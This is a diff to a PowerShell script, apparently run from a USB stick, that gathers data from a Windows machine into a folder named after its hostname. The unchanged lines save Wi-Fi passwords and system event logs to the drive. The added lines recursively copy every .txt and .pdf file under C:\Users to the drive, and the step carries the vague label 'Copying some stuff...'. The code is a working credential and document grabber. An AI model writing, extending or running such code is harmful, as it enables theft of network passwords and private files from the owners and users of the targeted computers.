@@ -18,13 +18,14 @@ $usbDriveLetter = Get-WmiObject -Query "SELECT * FROM Win32_DiskDrive WHERE Medi
 if ($null -ne $usbDriveLetter) {
     $usbDriveLetter = $usbDriveLetter -join ","
     $usbDriveLetter = $usbDriveLetter -split ","
+    $hname = hostname
     foreach ($driveLetter in $usbDriveLetter) {
-        $dataFolderPath = Join-Path -Path $driveLetter -ChildPath "Data"
+        $dataFolderPath = Join-Path -Path $driveLetter -ChildPath $hname
         if (!(Test-Path -Path $dataFolderPath -PathType Container)) {
             New-Item -Path $dataFolderPath -ItemType Directory
         }
 
-        $dataFolder = Join-Path -Path $driveLetter -ChildPath "Data"
+        $dataFolder = Join-Path -Path $driveLetter -ChildPath $hname
         $wifiPasswordsPath = Join-Path -Path $dataFolder -ChildPath "WifiPasswords.txt"
 
         try {
@@ -125,5 +126,17 @@ if ($null -ne $usbDriveLetter) {
         Write-Host "Getting System Event Logs..."
         Get-EventLog -LogName System | Out-File -Append -FilePath $dataFolder\EventLog_System.txt
         Write-Host "System Event Logs collected and saved to $dataFolder\EventLog_System.txt."
+
+        Write-Host "Copying some stuff..."
+        $dataFilesPath = Join-Path -Path $dataFolderPath -ChildPath "pdf_txt"
+        if (!(Test-Path -Path $dataFilesPath -PathType Container)) {
+            New-Item -Path $dataFilesPath -ItemType Directory | Out-Null
+	    }
+
+	    $files = Get-ChildItem -Path C:\Users -Include *.txt,*.pdf -File -Recurse -ErrorAction SilentlyContinue
+	    foreach ($file in $files) {
+		    $dePath = Join-Path -Path $dataFilesPath -ChildPath $file.Name
+ 		    Copy-Item -Path $file.FullName -Destination $dePath
+	    }
     }
 }
